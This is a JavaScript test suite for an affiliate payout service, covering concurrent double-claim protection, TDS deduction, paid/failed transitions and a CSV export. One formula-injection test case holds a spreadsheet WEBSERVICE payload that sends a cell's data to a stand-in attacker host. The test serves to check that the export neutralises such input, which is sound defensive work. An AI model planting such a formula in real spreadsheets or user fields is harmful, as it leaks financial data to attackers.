/**
 * Payout batching — the point where money actually leaves the bank.
 *
 * The invariant that matters most is the DOUBLE-CLAIM: two admins clicking "Pay" at the
 * same moment must produce one payout, not two, because the second one would be a real
 * transfer of real money for commissions that were already settled. The guard is the
 * commission rows' `payout: null`, not a lock, so it has to be exercised concurrently
 * to be worth anything.
 */

import mongoose from 'mongoose';
import { readdirSync } from 'fs';
import path from 'path';
import { fileURLToPath, pathToFileURL } from 'url';
import affiliatePayoutService from '../services/affiliatePayoutService.js';
import affiliateCommissionRepository from '../repositories/affiliateCommissionRepository.js';
import AffiliateCommission from '../models/AffiliateCommission.js';
import AffiliatePayout from '../models/AffiliatePayout.js';
import Affiliate from '../models/Affiliate.js';
import {
  COMMISSION_STATUS,
  COMMISSION_TYPE,
  MIN_PAYOUT_RUPEES,
  PAYOUT_STATUS,
} from '../config/affiliate.js';
import { ensureCriticalIndexes } from '../config/db.js';

const oid = () => new mongoose.Types.ObjectId();
const MODELS_DIR = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', 'models');

beforeAll(async () => {
  process.env.AFFILIATE_COMMISSION_ENABLED = 'true';
  for (const entry of readdirSync(MODELS_DIR, { withFileTypes: true })) {
    if (!entry.isFile() || !entry.name.endsWith('.js')) continue;
    await import(pathToFileURL(path.join(MODELS_DIR, entry.name)).href);
  }
  for (const model of Object.values(mongoose.models)) {
    await model.createCollection().catch(() => {});
    await model.syncIndexes().catch(() => {});
  }
  expect((await ensureCriticalIndexes()).ok).toBe(true);
}, 180000);

afterAll(() => { delete process.env.AFFILIATE_COMMISSION_ENABLED; });

let affiliate;
beforeEach(async () => {
  affiliate = await Affiliate.create({
    code: 'RAHUL10', name: 'Rahul', email: 'rahul@example.com',
    status: 'active', commissionPercent: 10, discountPercent: 5,
    payoutDetails: {
      accountHolderName: 'Rahul Nair',
      accountNumber: '123456789012',
      accountLast4: '9012',
      ifsc: 'HDFC0001234',
      panNumber: 'ABCDE1234F',
    },
  });
});

/** An approved, unclaimed commission row worth `amountPaise`. */
const approvedRow = (amountPaise, overrides = {}) =>
  AffiliateCommission.create({
    affiliate: affiliate._id,
    order: oid(),
    type: COMMISSION_TYPE.ACCRUAL,
    amountPaise,
    basePaise: amountPaise * 10,
    percent: 10,
    status: COMMISSION_STATUS.APPROVED,
    approvedAt: new Date(),
    ...overrides,
  });

const ABOVE_FLOOR = MIN_PAYOUT_RUPEES * 100 + 50000; // comfortably over the minimum

describe('buildBatch', () => {
  it('claims every approved row and totals from the rows it claimed', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(20000);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id, { adminId: oid() });

    expect(payout.grossPaise).toBe(ABOVE_FLOOR + 20000);
    expect(payout.netPaise).toBe(ABOVE_FLOOR + 20000); // 0% TDS by default
    expect(payout.commissionCount).toBe(2);
    expect(payout.status).toBe(PAYOUT_STATUS.DRAFT);

    const rows = await AffiliateCommission.find({ payout: payout._id });
    expect(rows).toHaveLength(2);
    expect(rows.every((r) => r.status === COMMISSION_STATUS.PAID)).toBe(true);
    // Nothing payable is left behind.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(0);
  });

  it('leaves pending rows alone — only what has matured is payable', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(999999, { status: COMMISSION_STATUS.PENDING });

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.grossPaise).toBe(ABOVE_FLOOR);
    expect(payout.commissionCount).toBe(1);
  });

  /*
    ⚠️ THE invariant. Two admins clicking Pay at the same instant. The claim lives in
    `{status:'approved', payout:null}`, so the loser's updateMany matches zero rows,
    the transaction aborts, and its empty payout is rolled back — exactly one document
    with money on it survives.
  */
  it('produces ONE payout under two concurrent builds; the loser 409s', async () => {
    await approvedRow(ABOVE_FLOOR);

    const results = await Promise.allSettled([
      affiliatePayoutService.buildBatch(affiliate._id),
      affiliatePayoutService.buildBatch(affiliate._id),
    ]);

    const fulfilled = results.filter((r) => r.status === 'fulfilled');
    const rejected = results.filter((r) => r.status === 'rejected');
    expect(fulfilled).toHaveLength(1);
    expect(rejected).toHaveLength(1);
    expect(rejected[0].reason.statusCode).toBe(409);

    // Exactly one payout carrying money, and the sum of its rows equals its gross.
    const payouts = await AffiliatePayout.find({ grossPaise: { $gt: 0 } });
    expect(payouts).toHaveLength(1);
    const rows = await AffiliateCommission.find({ payout: payouts[0]._id });
    expect(rows.reduce((s, r) => s + r.amountPaise, 0)).toBe(payouts[0].grossPaise);
  });

  it('refuses a balance below the minimum payout', async () => {
    await approvedRow(100); // ₹1

    await expect(affiliatePayoutService.buildBatch(affiliate._id))
      .rejects.toMatchObject({ statusCode: 400 });
    // And nothing was claimed — the rows stay payable.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(100);
  });

  it('refuses when there is nothing approved at all', async () => {
    await expect(affiliatePayoutService.buildBatch(affiliate._id)).rejects.toBeTruthy();
    expect(await AffiliatePayout.countDocuments({})).toBe(0);
  });

  /*
    The debt case, end to end. A refund that landed after a payout wrote a negative
    approved row; it nets off the next batch automatically, with no special code path.
  */
  it('nets a carried-forward debt off the next batch', async () => {
    await approvedRow(ABOVE_FLOOR);
    await approvedRow(-30000, { type: COMMISSION_TYPE.CLAWBACK });

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.grossPaise).toBe(ABOVE_FLOOR - 30000);
  });

  it('refuses to pay an affiliate whose net balance is negative', async () => {
    await approvedRow(-5000, { type: COMMISSION_TYPE.CLAWBACK });

    await expect(affiliatePayoutService.buildBatch(affiliate._id))
      .rejects.toMatchObject({ statusCode: 400 });
    // The debt is still standing, ready to be netted off future earnings.
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(-5000);
  });

  it('records TDS as a deduction, floored, without deriving the rate', async () => {
    affiliate.tdsPercent = 5;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.tdsPercent).toBe(5);
    expect(payout.tdsPaise).toBe(Math.floor(ABOVE_FLOOR * 5 / 100));
    expect(payout.netPaise).toBe(payout.grossPaise - payout.tdsPaise);
  });

  /*
    The bank snapshot identifies the destination account without copying financial PII
    into a second, longer-lived collection.
  */
  it('snapshots only the last four digits, never the account number or PAN', async () => {
    await approvedRow(ABOVE_FLOOR);

    const payout = await affiliatePayoutService.buildBatch(affiliate._id);

    expect(payout.bankSnapshot.accountLast4).toBe('9012');
    expect(payout.bankSnapshot.ifsc).toBe('HDFC0001234');
    const serialised = JSON.stringify(payout);
    expect(serialised).not.toMatch(/123456789012/);
    expect(serialised).not.toMatch(/ABCDE1234F/);
  });
});

describe('markPaid', () => {
  const build = async () => {
    await approvedRow(ABOVE_FLOOR);
    return affiliatePayoutService.buildBatch(affiliate._id);
  };

  it('records the transfer', async () => {
    const payout = await build();

    const paid = await affiliatePayoutService.markPaid(payout._id, {
      reference: 'UTR123456', method: 'neft', adminId: oid(),
    });

    expect(paid.status).toBe(PAYOUT_STATUS.PAID);
    expect(paid.reference).toBe('UTR123456');
    expect(paid.paidAt).toBeTruthy();
  });

  it('409s on a second attempt — one transfer is recorded once', async () => {
    const payout = await build();
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR1' });

    await expect(affiliatePayoutService.markPaid(payout._id, { reference: 'UTR2' }))
      .rejects.toMatchObject({ statusCode: 409 });
  });

  /*
    The same UTR against two payouts means one bank transfer booked as two payments —
    the books would then say we paid twice as much as we did.
  */
  it('409s when the same bank reference is reused on another payout', async () => {
    const first = await build();
    await affiliatePayoutService.markPaid(first._id, { reference: 'UTR-SAME' });

    await approvedRow(ABOVE_FLOOR);
    const second = await affiliatePayoutService.buildBatch(affiliate._id);

    await expect(affiliatePayoutService.markPaid(second._id, { reference: 'UTR-SAME' }))
      .rejects.toMatchObject({ statusCode: 409 });
  });

  it('requires a reference', async () => {
    const payout = await build();
    await expect(affiliatePayoutService.markPaid(payout._id, {}))
      .rejects.toMatchObject({ statusCode: 400 });
  });
});

describe('markFailed', () => {
  it('releases the rows back into the payable pool', async () => {
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(0);

    const failed = await affiliatePayoutService.markFailed(payout._id, {
      failureReason: 'Beneficiary account closed',
    });

    expect(failed.status).toBe(PAYOUT_STATUS.FAILED);
    const rows = await AffiliateCommission.find({ affiliate: affiliate._id });
    expect(rows.every((r) => r.status === COMMISSION_STATUS.APPROVED)).toBe(true);
    expect(rows.every((r) => r.payout === null)).toBe(true);
    expect(await affiliateCommissionRepository.payableBalancePaise(affiliate._id)).toBe(ABOVE_FLOOR);
  });

  it('lets the released rows be re-batched', async () => {
    await approvedRow(ABOVE_FLOOR);
    const first = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markFailed(first._id, {});

    const second = await affiliatePayoutService.buildBatch(affiliate._id);
    expect(second.grossPaise).toBe(ABOVE_FLOOR);
  });

  it('refuses to fail a payout that was already marked paid', async () => {
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR9' });

    await expect(affiliatePayoutService.markFailed(payout._id, {}))
      .rejects.toMatchObject({ statusCode: 409 });
    // The rows stay claimed — that money really did leave the bank.
    const rows = await AffiliateCommission.find({ affiliate: affiliate._id });
    expect(rows.every((r) => r.status === COMMISSION_STATUS.PAID)).toBe(true);
  });
});

describe('exportTdsCsv', () => {
  it('exports only paid payouts, with the PAN read from the affiliate', async () => {
    affiliate.tdsPercent = 5;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR-CSV' });

    // A draft that never landed must not appear — it is not a payment.
    await approvedRow(ABOVE_FLOOR);
    await affiliatePayoutService.buildBatch(affiliate._id);

    const csv = await affiliatePayoutService.exportTdsCsv();
    const lines = csv.split('\n');

    expect(lines[0]).toContain('PAN');
    expect(lines).toHaveLength(2); // header + the one PAID payout
    expect(lines[1]).toContain('ABCDE1234F');
    expect(lines[1]).toContain('UTR-CSV');
  });

  /*
    ⚠️ SPREADSHEET FORMULA INJECTION. `affiliate.name` comes from the unauthenticated
    application form, and this file is opened in Excel by someone in finance next to a
    column of PANs. Quoting alone does not help: Excel strips the quotes, then parses, so
    `=HYPERLINK(...)` or `=WEBSERVICE(...)` evaluates on open and can exfiltrate the row
    it sits in. A leading apostrophe forces the cell to text.
  */
  it.each([
    ['=', '=WEBSERVICE("http://evil.test/?d="&A1)'],
    ['+', '+1+1'],
    ['-', '-2+3'],
    ['@', '@SUM(1:1)'],
  ])('neutralises a name starting with %s', async (_lead, name) => {
    affiliate.name = name;
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: `UTR-${_lead}` });

    const csv = await affiliatePayoutService.exportTdsCsv();

    // The cell is quoted AND apostrophe-prefixed. Internal quotes are doubled by the
    // CSV escaping, so compare against the escaped form rather than the raw name.
    const nameCell = `"'${name.replace(/"/g, '""')}"`;
    expect(csv).toContain(nameCell);

    // No cell may BEGIN with a formula lead-in once the quote is stripped.
    for (const cell of csv.split('\n')[1].split(',')) {
      expect(cell.replace(/^"/, '')[0]).not.toMatch(/[=+\-@]/);
    }
  });

  it('escapes quotes so a name with a comma cannot shift the columns', async () => {
    affiliate.name = 'Nair, Rahul "RN"';
    await affiliate.save();
    await approvedRow(ABOVE_FLOOR);
    const payout = await affiliatePayoutService.buildBatch(affiliate._id);
    await affiliatePayoutService.markPaid(payout._id, { reference: 'UTR-ESC' });

    const csv = await affiliatePayoutService.exportTdsCsv();
    expect(csv).toContain('"Nair, Rahul ""RN"""');
  });
});
